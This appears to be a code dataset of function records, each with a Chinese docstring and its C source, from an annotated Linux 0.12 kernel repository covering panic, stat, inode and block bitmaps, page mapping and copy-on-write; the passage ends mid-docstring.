{"docstring": "/**\n * \u663e\u793a\u5185\u6838\u4e2d\u51fa\u73b0\u7684\u91cd\u5927\u9519\u8bef\u4fe1\u606f\uff0c\u5e76\u8fd0\u884c\u6587\u4ef6\u7cfb\u7edf\u540c\u6b65\u51fd\u6570,\u7136\u540e\u8fdb\u5165\u6b7b\u5faa\u73af\n * @note \u5982\u679c\u5f53\u524d\u8fdb\u7a0b\u662f\u4efb\u52a10\u7684\u8bdd\uff0c\u8fd8\u8bf4\u660e\u662f\u4ea4\u6362\u4efb\u52a1\u51fa\u9519\uff0c\u5e76\u4e14\u8fd8\u6ca1\u6709\u8fd0\u884c\u6587\u4ef6\u7cfb\u7edf\u540c\u6b65\u51fd\u6570\u3002\n */\n", "func_signal": "volatile void panic(const char * s)", "code": "{\n\tprintk(\"Kernel panic: %s\\n\\r\",s);\n\tif (current == task[0]) {\n\t\tprintk(\"In swapper task - not syncing\\n\\r\");\n\t} else {\n\t\tsys_sync();\n\t}\n\tfor(;;);\n}", "path": "linux-0.12\\kernel\\panic.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u83b7\u53d6\u6587\u4ef6\u72b6\u6001\n * \u6839\u636e\u7ed9\u5b9a\u7684\u6587\u4ef6\u540d\u83b7\u53d6\u76f8\u5173\u6587\u4ef6\u72b6\u6001\u4fe1\u606f\u3002\n * @param[in]\t\tfilename\t\u6307\u5b9a\u7684\u6587\u4ef6\u540d\n * @param[in/out]\tstatbuf\t\t\u5b58\u653e\u72b6\u6001\u4fe1\u606f\u7684\u7f13\u51b2\u533a\u6307\u9488\n * @retval\t\t\t\u6210\u529f\u8fd4\u56de0\uff0c\u51fa\u9519\u8fd4\u56de\u51fa\u9519\u7801\n */\n", "func_signal": "int sys_stat(char * filename, struct stat * statbuf)", "code": "{\n\tstruct m_inode * inode;\n\n\tif (!(inode = namei(filename))) {\n\t\treturn -ENOENT;\n\t}\n\tcp_stat(inode, statbuf);\n\tiput(inode);\n\treturn 0;\n}", "path": "linux-0.12\\fs\\stat.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u91ca\u653e\u6307\u5b9a\u7684i\u8282\u70b9\n * @param[in] \tinode \t\u6307\u5411\u8981\u91ca\u653e\u7684i\u8282\u70b9\u7684\u6307\u9488\n * @retval \t\tvoid\n */\n", "func_signal": "void free_inode(struct m_inode * inode)", "code": "{\n\tstruct super_block * sb;\n\tstruct buffer_head * bh;\n\n\tif (!inode) {\n\t\treturn;\n\t}\n\t/* i\u8282\u70b9\u4e0a\u7684\u8bbe\u5907\u53f7\u5b57\u6bb5\u4e3a0,\u8bf4\u660e\u8be5\u8282\u70b9\u6ca1\u6709\u4f7f\u7528 */\n\tif (!inode->i_dev) {\n\t\tmemset(inode, 0, sizeof(*inode));\n\t\treturn;\n\t}\n\t/* \u5982\u679c\u6b64i\u8282\u70b9\u8fd8\u6709\u5176\u4ed6\u7a0b\u5e8f\u5f15\u7528\uff0c\u5219\u4e0d\u91ca\u653e\uff0c\u8bf4\u660e\u5185\u6838\u6709\u95ee\u9898\uff0c\u505c\u673a */ \n\tif (inode->i_count > 1) {\n\t\tprintk(\"trying to free inode with count=%d\\n\", inode->i_count);\n\t\tpanic(\"free_inode\");\n\t}\n\t/* \u5982\u679c\u6587\u4ef6\u8fde\u63a5\u6570\u4e0d\u4e3a0,\u5219\u8868\u793a\u8fd8\u6709\u5176\u4ed6\u6587\u4ef6\u76ee\u5f55\u9879\u5728\u4f7f\u7528\u8be5\u8282\u70b9\uff0c\u56e0\u6b64\u4e5f\u4e0d\u5e94\u91ca\u653e\uff0c\u800c\u5e94\u8be5\u653e\u56de\u7b49 */\n\tif (inode->i_nlinks) {\n\t\tpanic(\"trying to free inode with links\");\n\t}\n\tif (!(sb = get_super(inode->i_dev))) {\n\t\tpanic(\"trying to free inode on nonexistent device\");\n\t}\n\tif (inode->i_num < 1 || inode->i_num > sb->s_ninodes) {\n\t\tpanic(\"trying to free inode 0 or nonexistant inode\");\n\t}\n\t/* \u627e\u5230inode\u6240\u5728\u7684\u903b\u8f91\u5757\uff0c\u5176\u4e2di_num>>13\u5373i_num/8192 */\n\tif (!(bh = sb->s_imap[inode->i_num >> 13])) { \n\t\tpanic(\"nonexistent imap in superblock\");\n\t}\n\t/* \u73b0\u5728\u6211\u4eec\u590d\u4f4di\u8282\u70b9\u5bf9\u5e94\u7684\u8282\u70b9\u4f4d\u56fe\u4e2d\u7684\u4f4d */\n\tif (clear_bit(inode->i_num & 8191, bh->b_data)) {\n\t\tprintk(\"free_inode: bit already cleared.\\n\\r\");\n\t}\n\t/* \u7f6ei\u8282\u70b9\u4f4d\u56fe\u6240\u5728\u7f13\u51b2\u533a\u5df2\u4fee\u6539\u6807\u5fd7\uff0c\u5e76\u6e05\u7a7a\u8be5i\u8282\u70b9\u7ed3\u6784\u6240\u5360\u5185\u5b58\u533a */\n\tbh->b_dirt = 1;\n\tmemset(inode, 0, sizeof(*inode));\n}", "path": "linux-0.12\\fs\\bitmap.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u628a\u4e00\u5185\u5bb9\u5df2\u4fee\u6539\u8fc7\u7684\u7269\u7406\u5185\u5b58\u9875\u9762page\u6620\u5c04\u5230\u6307\u5b9a\u7ebf\u6027\u5730\u5740address\u5904\n * @note\t\t\u4e0e\u4e0a\u9762\u7684put_page\u51fd\u6570\u4e00\u6837\uff0c\u4ec5\u591a\u8bbe\u7f6e\u4e86Dirty\u4f4d\n * @param[in]\tpage\t\u7269\u7406\u5185\u5b58\u9875\u9762\u7684\u5730\u5740\n * @param[in]\taddress\t\u6307\u5b9a\u7ebf\u6027\u5730\u5740\n * @retval\t\t\u6210\u529f\u8fd4\u56de\u9875\u9762\u7684\u7269\u7406\u5730\u5740\uff0c\u5931\u8d25\u8fd4\u56de0\n */\n", "func_signal": "unsigned long put_dirty_page(unsigned long page, unsigned long address)", "code": "{\n\tunsigned long tmp, *page_table;\n\n\t/* NOTE !!! This uses the fact that _pg_dir=0 */\n\n\tif (page < LOW_MEM || page >= HIGH_MEMORY)\n\t\tprintk(\"Trying to put page %p at %p\\n\", page, address);\n\tif (mem_map[(page-LOW_MEM)>>12] != 1)\n\t\tprintk(\"mem_map disagrees with %p at %p\\n\", page, address);\n\tpage_table = (unsigned long *) ((address >> 20) & 0xffc);\n\tif ((*page_table) & 1)\n\t\tpage_table = (unsigned long *) (0xfffff000 & *page_table);\n\telse {\n\t\tif (!(tmp = get_free_page()))\n\t\t\treturn 0;\n\t\t*page_table = tmp | 7;\n\t\tpage_table = (unsigned long *) tmp;\n\t}\n\tpage_table[(address >> 12) & 0x3ff] = page | (PAGE_DIRTY | 7);\n\t\n\t/* no need for invalidate */\n\treturn page;\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u5c06\u4e00\u9875\u7269\u7406\u5185\u5b58\u9875\u9762page\u6620\u5c04\u5230\u6307\u5b9a\u7ebf\u6027\u5730\u5740address\u5904\n * @param[in]\tpage\t\u7269\u7406\u5185\u5b58\u9875\u9762\u7684\u5730\u5740\n * @param[in]\taddress\t\u6307\u5b9a\u7ebf\u6027\u5730\u5740\n * @retval\t\t\u6210\u529f\u8fd4\u56de\u9875\u9762\u7684\u7269\u7406\u5730\u5740\uff0c\u5931\u8d25\u8fd4\u56de0\n */\n", "func_signal": "static unsigned long put_page(unsigned long page, unsigned long address)", "code": "{\n\tunsigned long tmp, *page_table;\n\n\t/* NOTE !!! This uses the fact that _pg_dir=0 */\n\t/* \u6ce8\u610f!!! \u8fd9\u91cc\u4f7f\u7528\u4e86\u9875\u76ee\u5f55\u8868\u57fa\u5730\u5740pg_dir=0\u7684\u6761\u4ef6 */\n\n\tif (page < LOW_MEM || page >= HIGH_MEMORY)\n\t\tprintk(\"Trying to put page %p at %p\\n\", page, address);\n\t/* page\u6307\u5411\u7684\u9875\u9762\u672a\u6807\u8bb0\u4e3a\u5df2\u4f7f\u7528\uff0c\u6545\u4e0d\u80fd\u505a\u6620\u5c04 */\n\tif (mem_map[(page - LOW_MEM) >> 12] != 1)\n\t\tprintk(\"mem_map disagrees with %p at %p\\n\", page, address);\n\n\t/* \u6839\u636eaddress\u4ece\u9875\u76ee\u5f55\u8868\u53d6\u51fa\u9875\u8868\u5730\u5740 */\n\tpage_table = (unsigned long *) ((address >> 20) & 0xffc);\n\tif ((*page_table) & 1)\t/* \u9875\u8868\u5b58\u5728 */\n\t\tpage_table = (unsigned long *) (0xfffff000 & *page_table);\n\telse {\n\t\tif (!(tmp = get_free_page()))\n\t\t\treturn 0;\n\t\t*page_table = tmp | 7; \t/* \u7f6e\u4f4d3\u4e2a\u6807\u5fd7(U/S\uff0cW/R\uff0cP) */\n\t\tpage_table = (unsigned long *) tmp;\n\t}\n\t/* \u5728\u9875\u8868\u4e2d\u8bbe\u7f6e\u9875\u9762\u5730\u5740\uff0c\u5e76\u7f6e\u4f4d3\u4e2a\u6807\u5fd7(U/S\uff0cW/R\uff0cP) */\n\tpage_table[(address >> 12) & 0x3ff] = page | 7;\n\n\t/* no need for invalidate */\n\treturn page;\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u590d\u5236\u6587\u4ef6\u53e5\u67c4(\u6587\u4ef6\u63cf\u8ff0\u7b26)\n * @param[in]\tfd\t\t\u6b32\u590d\u5236\u7684\u6587\u4ef6\u53e5\u67c4\n * @param[in]\targ\t\t\u6307\u5b9a\u65b0\u6587\u4ef6\u53e5\u67c4\u7684\u6700\u5c0f\u6570\u503c\n * @retval\t\t\u6210\u529f\u8fd4\u56de\u65b0\u6587\u4ef6\u53e5\u67c4\uff0c\u5931\u8d25\u8fd4\u56de\u51fa\u9519\u7801\n */\n", "func_signal": "static int dupfd(unsigned int fd, unsigned int arg)", "code": "{\n\tif (fd >= NR_OPEN || !current->filp[fd]) {\n\t\treturn -EBADF; /* \u6587\u4ef6\u53e5\u67c4\u9519\u8bef */\n\t}\n\tif (arg >= NR_OPEN) {\n\t\treturn -EINVAL; /* \u53c2\u6570\u975e\u6cd5 */\n\t}\n\t/* \u627e\u5230\u4e00\u4e2a\u6bd4arg\u5927\u7684\u6700\u5c0f\u7684\u672a\u4f7f\u7528\u7684\u53e5\u67c4\u503c */\n\twhile (arg < NR_OPEN) {\n\t\tif (current->filp[arg]) {\n\t\t\targ++;\n\t\t} else {\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (arg >= NR_OPEN) {\n\t\treturn -EMFILE;\t/* \u6253\u5f00\u6587\u4ef6\u592a\u591a */\n\t}\n\tcurrent->close_on_exec &= ~(1<<arg);\n\t(current->filp[arg] = current->filp[fd])->f_count++;\n\treturn arg;\n}", "path": "linux-0.12\\fs\\fcntl.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u590d\u5236\u6587\u4ef6\u72b6\u6001\u4fe1\u606f\n * @param[in]\t\tinode\t\t\u6587\u4ef6i\u8282\u70b9\n * @param[in/out]\tstatbuf\t\t\u7528\u6237\u6570\u636e\u7a7a\u95f4\u4e2dstat\u6587\u4ef6\u72b6\u6001\u7ed3\u6784\u6307\u9488\uff0c\u7528\u4e8e\u5b58\u653e\u53d6\u5f97\u7684\u72b6\u6001\u4fe1\u606f\n * @retval\t\t\tvoid\n */\n", "func_signal": "static void cp_stat(struct m_inode * inode, struct stat * statbuf)", "code": "{\n\tstruct stat tmp;\n\tint i;\n\n\tverify_area(statbuf, sizeof (struct stat));\n\ttmp.st_dev\t\t= inode->i_dev;\n\ttmp.st_ino\t\t= inode->i_num;\n\ttmp.st_mode\t\t= inode->i_mode;\n\ttmp.st_nlink\t= inode->i_nlinks;\n\ttmp.st_uid\t\t= inode->i_uid;\n\ttmp.st_gid\t\t= inode->i_gid;\n\ttmp.st_rdev\t\t= inode->i_zone[0];\t/* \u7279\u6b8a\u6587\u4ef6\u7684\u8bbe\u5907\u53f7 */\n\ttmp.st_size\t\t= inode->i_size;\n\ttmp.st_atime\t= inode->i_atime;\n\ttmp.st_mtime\t= inode->i_mtime;\n\ttmp.st_ctime\t= inode->i_ctime;\n\n\tfor (i = 0; i < sizeof(tmp); i++) {\n\t\tput_fs_byte(((char *) &tmp)[i], i + (char *) statbuf);\n\t}\n}", "path": "linux-0.12\\fs\\stat.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/*\n * This routine handles present pages, when users try to write\n * to a shared page. It is done by copying the page to a new address\n * and decrementing the shared-page counter for the old page.\n *\n * If it's in code space we exit with a segment error.\n */\n/*\n * \u5f53\u7528\u6237\u8bd5\u56fe\u4f4f\u4e00\u5171\u4eab\u9875\u9762\u4e0a\u5199\u65f6\uff0c\u8be5\u51fd\u6570\u5904\u7406\u5df2\u5b58\u5728\u7684\u5185\u5b58\u9875\u9762(\u5199\u65f6\u590d\u5236)\uff0c\u5b83\u662f\u901a\u8fc7\u5c06\u9875\u9762\u590d\u5236\u5230\n * \u4e00\u4e2a\u65b0\u5730\u5740\u4e0a\u5e76\u4e14\u9012\u51cf\u539f\u9875\u9762\u7684\u5171\u4eab\u8ba1\u6570\u503c\u5b9e\u73b0\u7684\u3002\n *\n * \u5982\u679c\u5b83\u5728\u4ee3\u7801\u7a7a\u95f4\uff0c\u6211\u4eec\u5c31\u663e\u793a\u6bb5\u51fa\u9519\u4fe1\u606f\u5e76\u9000\u51fa\u3002\n */\n/** \n * \u6267\u884c\u5199\u4fdd\u62a4\u9875\u9762\u5904\u7406\uff08\u5728page.s\u7a0b\u5e8f\u4e2d\u88ab\u8c03\u7528\uff09\n * \u5199\u5171\u4eab\u9875\u9762\u65f6\u9700\u590d\u5236\u9875\u9762(\u5199\u65f6\u590d\u5236)\u3002\n * @param[in]\terror_code\t\t\u51fa\u9519\u7c7b\u578b\uff08\u6ca1\u6709\u7528\u5230\uff09\n * @param[in]\taddress\t\t\t\u4ea7\u751f\u5f02\u5e38\u7684\u9875\u9762\u7684\u7ebf\u6027\u5730\u5740\uff08CR2\u5bc4\u5b58\u5668\u7684\u503c\uff09\n * @return\t\tvoid\n */\n", "func_signal": "void do_wp_page(unsigned long error_code, unsigned long address)", "code": "{\n\tif (address < TASK_SIZE)\n\t\tprintk(\"\\n\\rBAD! KERNEL MEMORY WP-ERR!\\n\\r\");\n\tif (address - current->start_code > TASK_SIZE) {\n\t\tprintk(\"Bad things happen: page error in do_wp_page\\n\\r\");\n\t\tdo_exit(SIGSEGV);\n\t}\n#if 0\n\t/* we cannot do this yet: the estdio library writes to code space */\n\t/* stupid, stupid. I really want the libc.a from GNU */\n\t/* \u6211\u4eec\u73b0\u5728\u8fd8\u4e0d\u80fd\u8fd9\u6837\u505a:\u56e0\u4e3aestdio\u5e93\u4f1a\u5728\u4ee3\u7801\u7a7a\u95f4\u6267\u884c\u5199\u64cd\u4f5c */\n\t/* \u771f\u662f\u592a\u611a\u8822\u4e86\u3002\u6211\u771f\u60f3\u4eceGNU\u5f97\u5230libca\u5e93\u3002 */\n\t/* \u5982\u679c\u7ebf\u6027\u5730\u5740\u4f4d\u4e8e\u8fdb\u7a0b\u7684\u4ee3\u7801\u7a7a\u95f4(\u53ea\u8bfb)\u4e2d\uff0c\u5219\u7ec8\u6b62\u6267\u884c\u7a0b\u5e8f */\n\tif (CODE_SPACE(address))\n\t\tdo_exit(SIGSEGV);\n#endif\n\t/* \u6839\u636e\u7ebf\u6027\u5730\u5740\u8ba1\u7b97\u7269\u7406\u9875\u9762\u5730\u5740 */\n\tun_wp_page((unsigned long *)\n\t\t(((address >> 10) & 0xffc) + (0xfffff000 &\n\t\t*((unsigned long *) ((address >> 20) & 0xffc)))));\n\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/* \u663e\u793a\u7cfb\u7edf\u5185\u5b58\u4fe1\u606f\uff08\u5728chr_drv/keyboard.S\u4e2d\u88ab\u8c03\u7528\uff09 */\n", "func_signal": "void show_mem(void)", "code": "{\n\tint i, j, k, free = 0, total = 0;\n\tint shared = 0;\n\tunsigned long * pg_tbl;\n\n\t/* \u6839\u636emem_map[]\u7edf\u8ba1\u4e3b\u5185\u5b58\u533a\u9875\u9762\u603b\u6570total\uff0c\u4ee5\u53ca\u5176\u4e2d\u7a7a\u95f2\u9875\u9762\u6570free\u548c\u88ab\u5171\u4eab\u7684\u9875\u9762\u6570shared */\n\tprintk(\"Mem-info:\\n\\r\");\n\tfor (i = 0 ; i < PAGING_PAGES ; i++) {\n\t\tif (mem_map[i] == USED) { /* \u4e0d\u53ef\u7528\u9875\u9762 */\n\t\t\tcontinue;\n\t\t}\n\t\ttotal ++;\n\t\tif (!mem_map[i]) {\n\t\t\tfree ++;\n\t\t}\n\t\telse {\n\t\t\tshared += mem_map[i] - 1;/* \u5171\u4eab\u7684\u9875\u9762\u6570(\u5b57\u8282\u503c>1) */\n\t\t}\n\t}\n\tprintk(\"%d free pages of %d\\n\\r\", free, total);\n\tprintk(\"%d pages shared\\n\\r\", shared);\n\t/* \u7edf\u8ba1\u5206\u9875\u7ba1\u7406\u7684\u903b\u8f91\u9875\u9762\u6570 */\n\tk = 0;\t\t/* \u4e00\u4e2a\u8fdb\u7a0b\u5360\u7528\u9875\u9762\u7edf\u8ba1\u503c */\n\tfor (i = 4; i < 1024; ) { \t/*\u9875\u76ee\u5f55\u8868\u524d4\u9879\u4f9b\u5185\u6838\u4ee3\u7801\u4f7f\u7528\uff0c\u4e0d\u5217\u4e3a\u7edf\u8ba1\u8303\u56f4 */\n\t\tif (1 & pg_dir[i]) {\n\t\t\tif (pg_dir[i] > HIGH_MEMORY) {\t/* \u76ee\u5f55\u9879\u5185\u5bb9\u4e0d\u6b63\u5e38 */\n\t\t\t\tprintk(\"page directory[%d]: %08X\\n\\r\", i, pg_dir[i]);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (pg_dir[i] > LOW_MEM) {\n\t\t\t\tfree ++, k ++;\t\t/* \u7edf\u8ba1\u9875\u8868\u5360\u7528\u9875\u9762 */\n\t\t\t}\n\t\t\tpg_tbl = (unsigned long *) (0xfffff000 & pg_dir[i]);\n\t\t\tfor (j = 0 ; j < 1024 ; j++) {\n\t\t\t\tif ((pg_tbl[j]&1) && pg_tbl[j] > LOW_MEM){\n\t\t\t\t\tif (pg_tbl[j] > HIGH_MEMORY){ /* \u9875\u8868\u9879\u5185\u5bb9\u4e0d\u6b63\u5e38 */\n\t\t\t\t\t\tprintk(\"page_dir[%d][%d]: %08X\\n\\r\", i, j, pg_tbl[j]);\n\t\t\t\t\t}\n\t\t\t\t\telse{\n\t\t\t\t\t\tk ++, free ++;\t/* \u7edf\u8ba1\u9875\u8868\u9879\u5bf9\u5e94\u9875\u9762 */\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\ti++;\n\t\t/* \u6bcf\u4e2a\u4efb\u52a1\u7ebf\u6027\u7a7a\u95f4\u957f\u5ea6\u662f64MB\uff0c\u6bcf\u7edf\u8ba1\u4e8616\u4e2a\u76ee\u5f55\u9879\u5c31\u7edf\u8ba1\u4e86\u4e00\u4e2a\u4efb\u52a1\u5360\u7528\u7684\u9875\u8868 */\n\t\tif (!(i & 15) && k) {\t/* k=0\u8bf4\u660e\u5bf9\u5e94\u7684\u4efb\u52a1\u6ca1\u6709\u521b\u5efa\u6216\u8005\u5df2\u7ecf\u7ec8\u6b62 */\n\t\t\tk ++, free ++;\t\t/* one page/process for task_struct */\n\t\t\tprintk(\"Process %d: %d pages\\n\\r\", (i >> 4) - 1, k);\n\t\t\tk = 0;\n\t\t}\n\t}\n\tprintk(\"Memory found: %d (%d)\\n\\r\\n\\r\", free - shared, total);\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u5411\u8bbe\u5907dev\u7533\u8bf7\u4e00\u4e2a\u903b\u8f91\u5757\n * @param[in]\tdev\t\t\u8bbe\u5907\u53f7\n * @retval\t\t\u6210\u529f\u8fd4\u56de\u903b\u8f91\u5757\u53f7\uff0c\u5931\u8d25\u8fd4\u56de0\u3002\n */\n", "func_signal": "int new_block(int dev)", "code": "{\n\tstruct buffer_head * bh;\n\tstruct super_block * sb;\n\tint i, j;\n\n\tif (!(sb = get_super(dev))) {\n\t\tpanic(\"trying to get new block from nonexistant device\");\n\t}\n\t/* \u626b\u63cf\u6587\u4ef6\u7cfb\u7edf\u76848\u5757\u903b\u8f91\u5757\u4f4d\u56fe\uff0c\u5bfb\u627e\u9996\u4e2a0\u503c\u4f4d\uff0c\u4ee5\u5bfb\u627e\u7a7a\u95f2\u903b\u8f91\u5757\uff0c\u83b7\u53d6\u8bbe\u7f6e\u8be5\u903b\u8f91\u5757\u7684\u5757\u53f7 */\n\tj = 8192;\n\tfor (i = 0 ; i < 8 ; i++) {\n\t\tif ((bh = sb->s_zmap[i])) {\n\t\t\tif ((j = find_first_zero(bh->b_data)) < 8192) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t/* \u7136\u540e\u5982\u679c\u5168\u90e8\u626b\u63cf\u5b8c8\u5757\u903b\u8f91\u5757\u4f4d\u56fe\u7684\u6240\u6709\u4f4d\u8fd8\u6ca1\u6709\u627e\u52300\u503c\u4f4d\u6216\u8005\u4f4d\u56fe\u6240\u5728\u7684\u7f13\u51b2\u5757\u6307\u9488\u65e0\u6548\n\t (bn = NULL)\u5219\u8868\u793a\u5f53\u524d\u6ca1\u6709\u7a7a\u95f2\u903b\u8f91\u5757 */\n\tif (i >= 8 || !bh || j >= 8192) {\n\t\treturn 0;\n\t}\n\t/* \u8bbe\u7f6e\u627e\u5230\u7684\u65b0\u903b\u8f91\u5757j\u5bf9\u5e94\u903b\u8f91\u5757\u4f4d\u56fe\u4e2d\u7684\u4f4d\uff0c\u82e5\u5bf9\u5e94\u4f4d\u5df2\u7ecf\u7f6e\u4f4d\uff0c\u5219\u51fa\u9519\u505c\u673a */\n\tif (set_bit(j, bh->b_data)) {\n\t\tpanic(\"new_block: bit already set\");\n\t}\n\tbh->b_dirt = 1;\n\t/* \u8ba1\u7b97\u8be5\u5757\u5728\u903b\u8f91\u5757\u4f4d\u56fe\u4e2d\u4f4d\u504f\u79fb\u503c\uff0c\u504f\u79fb\u503c\u5927\u4e8e\u8be5\u8bbe\u5907\u4e0a\u7684\u603b\u903b\u8f91\u5757\u6570\uff0c\u5219\u51fa\u9519 */\n\tj += i * 8192 + sb->s_firstdatazone - 1;\n\tif (j >= sb->s_nzones) {\n\t\treturn 0;\n\t}\n\t/* \u5728\u9ad8\u901f\u7f13\u51b2\u533a\u4e2d\u4e3a\u8be5\u8bbe\u5907\u4e0a\u6307\u5b9a\u7684\u903b\u8f91\u5757\u53f7\u53d6\u5f97\u4e00\u4e2a\u7f13\u51b2\u5757\uff0c\u5e76\u8fd4\u56de\u7f13\u51b2\u5757\u5934\u6307\u9488 */\n\tif (!(bh = getblk(dev, j))) {\n\t\tpanic(\"new_block: cannot get block\");\n\t}\n\t/* \u56e0\u4e3a\u65b0\u53d6\u51fa\u7684\u903b\u8f91\u5757\u5176\u5f15\u7528\u6b21\u6570\u4e00\u5b9a\u4e3a1\uff0c\u82e5\u4e0d\u662f1\uff0c\u8bf4\u660e\u5185\u6838\u6709\u95ee\u9898\u3002*/\n\tif (bh->b_count != 1) {\n\t\tpanic(\"new block: count is != 1\");\n\t}\n\t/* \u5c06\u65b0\u903b\u8f91\u5757\u6e05\u96f6\uff0c\u5e76\u8bbe\u7f6e\u5176\u5df2\u66f4\u65b0\u6807\u5fd7\u548c\u5df2\u4fee\u6539\u6807\u5fd7\u3002\u7136\u540e\u91ca\u653e\u5bf9\u5e94\u7f13\u51b2\u5757\uff0c\u8fd4\u56de\u903b\u8f91\u5757\u53f7 */\n\tclear_block(bh->b_data);\n\tbh->b_uptodate = 1;\n\tbh->b_dirt = 1;\n\tbrelse(bh);\n\treturn j;\n}", "path": "linux-0.12\\fs\\bitmap.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/**\n * \u53d6\u5f97\u4e00\u9875\u7a7a\u95f2\u7684\u7269\u7406\u5185\u5b58\u5e76\u6620\u5c04\u5230\u6307\u5b9a\u7ebf\u6027\u5730\u5740\u5904\n * @param[in]\taddress\t\t\u6307\u5b9a\u9875\u9762\u7684\u7ebf\u6027\u5730\u5740\n * @return\t\tvoid\n */\n", "func_signal": "void get_empty_page(unsigned long address)", "code": "{\n\tunsigned long tmp;\n\n\t/* \u82e5\u4e0d\u80fd\u53d6\u5f97\u4e00\u7a7a\u95f2\u9875\u9762\uff0c\u6216\u8005\u4e0d\u80fd\u5c06\u6240\u53d6\u9875\u9762\u653e\u7f6e\u5230\u6307\u5b9a\u5730\u5740\u5904\uff0c\u5219\u663e\u793a\u5185\u5b58\u4e0d\u591f\u7684\u4fe1\u606f */\n\tif (!(tmp = get_free_page()) || !put_page(tmp, address)) {\n\t\tfree_page(tmp);\t\t/* 0 is ok - ignored */\n\t\toom();\n\t}\n}", "path": "linux-0.12\\mm\\memory.c", "repo_name": "ultraji/linux-0.12", "stars": 390, "license": "gpl-3.0", "language": "c", "size": 5567}
{"docstring": "/*\n * \u597d\u4e86\uff0c\u4e0b\u9762\u662f\u5185\u5b58\u7ba1\u7406mm\u4e2d\u6700\u4e3a\u590d\u6742\u7684\u7a0b\u5e8f\u4e4b\u4e00\u3002\u5b83\u901a\u8fc7\u53ea\u590d\u5236\u5185\u5b58\u9875\u9762\u6765\u590d\u5236\u4e00\u5b9a\u8303\u56f4\u5185\u7ebf\u6027\u5730\u5740\u4e2d\u7684\u5185\n * \u5bb9\u3002\u5e0c\u671b\u4ee3\u7801\u4e2d\u6ca1\u6709\u9519\u8bef\uff0c\u56e0\u4e3a\u6211\u4e0d\u60f3\u518d\u8c03\u8bd5\u8fd9\u5757\u4ee3\u7801\u4e86:-)\n *\n * \u6ce8\u610f\uff01\u6211\u4eec\u5e76\u4e0d\u590d\u5236\u4efb\u4f55\u5185\u5b58\u5757\uff0c\u5185\u5b58\u5757\u7684\u5730\u5740\u9700\u8981\u662f4MB\u7684\u500d\u6570(\u6b63\u597d\u4e00\u4e2a\u9875\u76ee\u5f55\u9879\u5bf9\u5e94\u7684\u5185\u5b58\u957f\u5ea6)\uff0c\u56e0\n * \u4e3a\u8fd9\u6837\u5904\u7406\u53ef\u4f7f\u51fd\u6570\u7b80\u5355\u3002\u4e0d\u7ba1\u600e\u6837\uff0c\u5b83\u4ec5\u88abfork()\u4f7f\u7528\u3002\n *\n * \u6ce8\u610f2\uff01\uff01\u5f53from==0\u65f6\uff0c\u8bf4\u660e\u662f\u5728\u4e3a\u7b2c\u4e00\u6b21fork()\u8c03\u7528\u590d\u5236\u5185\u6838\u7a7a\u95f4\u3002\u6b64\u65f6\u6211\u4eec\u5c31\u4e0d\u60f3\u590d\u5236\u6574\u4e2a\u9875\u76ee\u5f55\u9879\n * \u5bf9\u5e94\u7684\u5185\u5b58\uff0c\u56e0\u4e3a\u8fd9\u6837\u505a\u4f1a\u5bfc\u81f4\u5185\u5b58\u4e25\u91cd\u6d6a\u8d39\u6211\u4eec\u53ea\u987b\u590d\u5236\u5f00\u5934160\u4e2a\u9875\u9762\uff0c\u5bf9\u5e94640KB\u3002\u5373\u4f7f\u662f\u590d\u5236\u8fd9\u4e9b\u9875\n * \u9762\u4e5f\u5df2\u7ecf\u8d85\u51fa\u6211\u4eec\u7684\u9700\u6c42,\u4f46\u8fd9\u4e0d\u4f1a\u5360\u7528\u66f4\u591a\u7684\u5185\u5b58,\u5728\u4f4e1MB\u5185\u5b58\u8303\u56f4\u5185\u4e0d\u6267\u884c\u5199\u65f6\u590d\u5236\u64cd\u4f5c\uff0c\u6240\u4ee5\u8fd9\u4e9b\u9875\u9762\n * \u53ef\u4ee5\u4e0e\u5185\u6838\u5171\u4eab\u3002\u56e0\u6b64\u8fd9\u662fnr=xxxx\u7684\u7279\u6b8a\u60c5\u51b5(nr\u5728\u7a0b\u5e8f\u4e2d\u6307\u9875\u9762\u6570)\u3002\n */\n/**\n * \u590d\u5236\u76ee\u5f55\u8868\u9879\u548c\u9875\u8868\u9879\uff08\u7528\u4e8e\u5199\u65f6\u590d\u5236\u673a\u5236\uff09\n * \u590d\u5236\u6307\u5b9a\u7ebf\u6027\u5730\u5740\u548c\u957f\u5ea6\u5185\u5b58\u5bf9\u5e94\u7684\u9875\u76ee\u5f55\u9879\u548c\u9875\u8868\u9879\uff0c\u4ece\u800c\u88ab\u590d\u5236\u7684\u9875\u76ee\u5f55\u548c\u9875\u8868\u5bf9\u5e94\u7684\u539f\u7269\u7406\u5185\u5b58\u9875\u9762\u533a\n * 